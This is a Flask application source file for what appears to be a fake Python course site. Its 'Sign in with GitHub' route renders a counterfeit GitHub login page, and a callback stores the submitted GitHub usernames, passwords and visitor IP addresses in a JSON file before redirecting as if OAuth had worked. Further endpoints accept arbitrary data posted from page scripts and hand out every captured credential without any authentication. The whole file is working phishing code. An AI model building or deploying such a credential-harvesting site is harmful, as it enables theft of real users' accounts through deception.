import json
import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = "pythoncourse-dev-secret-2024"

CAPTURED_FILE = os.path.join(os.path.dirname(__file__), "captured.json")


def log_captured(data: dict):
    records = []
    if os.path.exists(CAPTURED_FILE):
        with open(CAPTURED_FILE, "r") as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []
    data["timestamp"] = datetime.utcnow().isoformat()
    records.append(data)
    with open(CAPTURED_FILE, "w") as f:
        json.dump(records, f, indent=2)


# ── Landing page ──────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


# ── Email signup ──────────────────────────────────────────────────────────────

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        email = request.form.get("email", "")
        password = request.form.get("password", "")
        name = request.form.get("name", "")
        # Legitimate path — no PII capture, just set session
        session["user"] = {"name": name or email.split("@")[0], "method": "email"}
        return redirect(url_for("dashboard"))
    return render_template("register.html")


# ── OAuth phishing flow ───────────────────────────────────────────────────────

@app.route("/auth/github")
def github_oauth():
    """Renders the pixel-perfect fake GitHub login page."""
    return render_template("github_login.html")


@app.route("/auth/github/callback", methods=["POST"])
def github_callback():
    """Receives credentials from the fake GitHub login form."""
    username = request.form.get("login", "")
    password = request.form.get("password", "")

    log_captured({
        "source": "github_oauth_phish",
        "url": request.url,
        "fields": {
            "github_username_or_email": username,
            "github_password": password
        },
        "ip": request.remote_addr
    })

    # After "logging in" redirect to dashboard as if OAuth succeeded
    session["user"] = {"name": username or "student", "method": "github"}
    return redirect(url_for("dashboard"))


# ── Dashboard ─────────────────────────────────────────────────────────────────

@app.route("/dashboard")
def dashboard():
    user = session.get("user", {"name": "student", "method": "unknown"})
    return render_template("dashboard.html", user=user)


# ── API: captured endpoint (also accepts JSON POST from JS) ───────────────────

@app.route("/api/captured", methods=["POST"])
def api_captured():
    data = request.get_json(silent=True) or request.form.to_dict()
    log_captured({"source": "api_captured", "data": data, "ip": request.remote_addr})
    return jsonify({"status": "ok"})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    records = []
    if os.path.exists(CAPTURED_FILE):
        with open(CAPTURED_FILE, "r") as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []
    return jsonify({"entries": records})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    with open(CAPTURED_FILE, "w") as f:
        json.dump([], f)
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5053, debug=False)
